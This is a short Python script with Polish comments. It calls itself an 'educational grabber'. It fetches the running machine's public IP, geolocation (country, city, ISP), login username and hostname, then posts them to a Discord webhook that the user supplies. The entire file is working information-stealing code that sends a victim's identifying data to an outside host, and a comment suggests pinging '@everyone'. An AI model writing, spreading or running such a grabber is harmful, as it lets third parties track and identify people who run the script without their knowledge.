import requests
import os
import socket
from datetime import datetime

# WSTAW SWÓJ WEBHOOK TUTAJ
WEBHOOK_URL = "https://discord.com/api/webhooks/TUTAJ_TWÓJ_WEBHOOK"

def get_ip_info():
    try:
        ip = requests.get('https://api.ipify.org').text
        location_data = requests.get(f"http://ip-api.com/json/{ip}").json()
        return ip, location_data
    except Exception as e:
        return None, None

def send_to_webhook(ip, data):
    username = os.getlogin()
    hostname = socket.gethostname()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    embed = {
        "title": f"📡 Dane systemu - {username}",
        "description": f"""```python
Publiczne IP: {ip}
Komputer: {hostname}
Użytkownik: {username}
Kraj: {data.get("country")}
Miasto: {data.get("city")}
Dostawca: {data.get("isp")}
Data i czas: {now}
```""",
        "color": 0x3498db,
        "footer": {"text": "Edukacyjny grabber by You"}
    }

    payload = {
        "content": "",  # tutaj możesz dodać np. "@everyone"
        "embeds": [embed]
    }

    try:
        requests.post(WEBHOOK_URL, json=payload)
        print("[✅] Wysłano dane na webhook.")
    except Exception as e:
        print(f"[❌] Błąd wysyłania: {e}")

def main():
    ip, data = get_ip_info()
    if ip and data:
        send_to_webhook(ip, data)
    else:
        print("[❌] Nie udało się pobrać danych.")

if __name__ == "__main__":
    main()
